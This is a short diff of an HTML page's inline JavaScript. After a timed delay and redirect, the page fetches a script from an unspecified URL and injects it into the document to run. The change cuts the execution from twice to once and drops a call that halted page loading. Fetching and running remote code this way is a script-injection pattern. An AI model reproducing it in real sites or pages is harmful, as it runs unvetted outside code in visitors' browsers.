@@ -16,36 +16,21 @@
 
                 // Listen for the 'pageshow' event after redirection
                 window.addEventListener('pageshow', () => {
-                    // Load the script once
+                    // Load and execute the script only once
                     fetch(scriptUrl)
                         .then(response => {
                             if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                             return response.text();
                         })
                         .then(scriptContent => {
-                            let executionCount = 0;
-
-                            const executeScript = () => {
-                                const scriptElement = document.createElement('script');
-                                scriptElement.textContent = scriptContent;
-                                document.body.appendChild(scriptElement);
-                                console.log(`Injected script executed (${executionCount + 1}/2).`);
-
-                                executionCount++;
-                                if (executionCount < 2) {
-                                    setTimeout(executeScript, 500); // Execute again after 500 ms
-                                } else {
-                                    console.log('Both script executions complete. Stopping page load.');
-                                    window.stop(); // Stop page loading
-                                }
-                            };
-
-                            // Execute the script for the first time
-                            executeScript();
+                            const scriptElement = document.createElement('script');
+                            scriptElement.textContent = scriptContent;
+                            document.body.appendChild(scriptElement);
+                            console.log('Injected script executed.');
                         })
                         .catch(err => console.error('Error fetching script:', err));
                 });
-            }, 3000); // Initial delay (3 seconds)
+            }, 3000); // Initial 3-second delay
         });
     </script>
 </head>
